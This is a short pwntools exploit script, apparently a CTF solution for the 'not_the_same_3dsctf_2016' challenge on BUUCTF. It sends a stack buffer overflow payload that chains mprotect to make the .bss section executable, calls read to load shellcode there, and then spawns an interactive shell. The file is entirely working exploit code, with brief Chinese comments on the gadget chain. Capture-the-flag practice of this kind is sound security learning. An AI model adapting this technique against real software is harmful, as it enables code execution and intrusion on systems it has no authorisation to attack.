from pwn import *

context(log_level='debug', arch='i386', os='linux')
sl = lambda x: io.sendline(x)

io = process('not_the_same_3dsctf_2016')
# io = remote('node4.buuoj.cn', 25445)
elf = ELF('./not_the_same_3dsctf_2016')
gdb.attach(io, 'b*0x8048A00')

write = elf.sym['write']
mprotect = elf.sym['mprotect']
p3_ret = 0x0804f420

read = elf.sym['read']
bss = 0x80ec000
shellcode = asm(shellcraft.sh())

payload = flat(b'a' * 0x2d, mprotect, p3_ret) # 返回p3_ret后, pop3次把3个参数从栈弹出=> 来到read
payload += flat(bss, 0x1000, 7)  # mprotect 3个参数
payload += flat(read, bss, 0, bss, 0x100)

sl(payload)
sl(shellcode)

io.interactive()
